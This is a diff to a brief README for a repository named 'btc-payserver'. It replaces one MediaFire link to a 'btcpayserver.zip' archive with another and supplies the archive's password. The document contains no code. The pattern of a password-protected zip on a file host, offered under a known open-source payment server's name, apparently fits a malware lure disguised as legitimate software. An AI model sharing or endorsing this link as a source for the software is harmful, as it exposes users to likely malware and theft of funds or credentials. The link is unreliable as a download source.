@@ -1,6 +1,6 @@
 # btc-payserver
 
-[Click Here To Download](https://www.mediafire.com/file/n41iohxt4gh3b75/btcpayserver.zip/file)
+[Click Here To Download](https://www.mediafire.com/file/uiyywwkr587oytt/btcpayserver.zip/file)
 [Pass : S3rv3r%.]
 
 
